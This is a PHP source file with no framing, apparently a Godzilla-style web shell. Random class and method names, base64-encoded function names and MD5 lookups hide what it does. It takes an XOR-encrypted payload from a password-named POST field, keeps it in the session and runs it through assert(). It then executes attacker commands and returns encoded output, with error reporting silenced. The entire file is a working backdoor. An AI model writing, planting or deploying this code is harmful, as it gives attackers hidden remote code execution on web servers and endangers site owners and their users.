<?php

class RvLZICEk
{
    private $p;
    private $k;
    private $func_map = [];

    public function __construct()
    {
        $this->UPivecLC();

        $b64d = $this->kinuLEkY('84cbd'); 
        $this->p = $b64d('cGFzczEwMjQ=');
        $this->k = $b64d('ZTJmZTUyZGFiMmE4MWIzNA==');
    }
    
    private function UPivecLC()
    {
        $encoded_funcs = 'ZXhwbG9kZXxzZXNzaW9uX3N0YXJ0fHNldF90aW1lX2xpbWl0fGVycm9yX3JlcG9ydGluZ3xiYXNlNjRfZGVjb2RlfHN0cmxlbnxzdHJwb3N8YXNzZXJ0fG1kNXxzdWJzdHJ8YmFzZTY0X2VuY29kZQ==';
        $func_names = explode('|', base64_decode($encoded_funcs));
        
        foreach ($func_names as $name) {
            $this->func_map[substr(md5($name), 0, 5)] = $name;
        }
    }

    private function kinuLEkY($h)
    {
        return isset($this->func_map[$h]) ? $this->func_map[$h] : '';
    }

    private function ZcWnXNNW($d, $k)
    {
        $sl = $this->kinuLEkY('73d3a');
        for ($i = 0; $i < $sl($d); $i++) {
            $c = $k[$i + 1 & 15];
            $d[$i] = $d[$i] ^ $c;
        }
        return $d;
    }

    public function eWJhOLSN()
    {
        $f1 = $this->kinuLEkY('c0390'); @$f1();
        $f2 = $this->kinuLEkY('bf14a'); @$f2(0);
        $f3 = $this->kinuLEkY('b3885'); @$f3(0);

        $pv = $this->p;
        $b64d = $this->kinuLEkY('84cbd');
        $pn = $b64d('cGF5bG9hZA==');
        $kv = $this->k;

        if (isset($_POST[$pv])) {
            $dv = $this->ZcWnXNNW($b64d($_POST[$pv]), $kv);
            if (isset($_SESSION[$pn])) {
                $pl = $this->ZcWnXNNW($_SESSION[$pn], $kv);
                $strpos = $this->kinuLEkY('b66b6');
                if ($strpos($pl, $b64d('Z2V0QmFzaWNzSW5mbw==')) === false) {
                    $pl = $this->ZcWnXNNW($pl, $kv);
                }
                $assert = $this->kinuLEkY('e44e4');
                @$assert($pl);

                $md5 = $this->kinuLEkY('1bc29');
                $substr = $this->kinuLEkY('07003');
                $b64e = $this->kinuLEkY('c7c28');

                echo $substr($md5($pv . $kv), 0, 16);
                echo $b64e($this->ZcWnXNNW(@run($dv), $kv));
                echo $substr($md5($pv . $kv), 16);
            } else {
                $strpos = $this->kinuLEkY('b66b6');
                if ($strpos($dv, $b64d('Z2V0QmFzaWNzSW5mbw==')) !== false) {
                    $_SESSION[$pn] = $this->ZcWnXNNW($dv, $kv);
                }
            }
        }
    }
}

$o = new RvLZICEk();
$o->eWJhOLSN(); 